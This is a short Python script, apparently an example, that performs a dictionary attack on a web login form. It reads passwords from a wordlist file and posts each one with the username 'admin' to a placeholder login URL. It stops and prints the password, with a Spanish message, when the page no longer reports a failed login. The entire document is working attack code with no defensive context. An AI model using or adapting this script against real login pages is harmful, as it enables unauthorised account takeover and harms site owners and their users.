import requests
   
   target_url = "http://example.com/login"
   data_dict = {"username": "admin", "password": "", "login": "submit"}
   
   with open("passwords.txt", "r") as wordlist_file:
       for line in wordlist_file:
           word = line.strip()
           data_dict["password"] = word
           response = requests.post(target_url, data=data_dict)
           if "Login failed" not in response.content.decode():
               print("[+] Contraseña encontrada: {}".format(word))
               break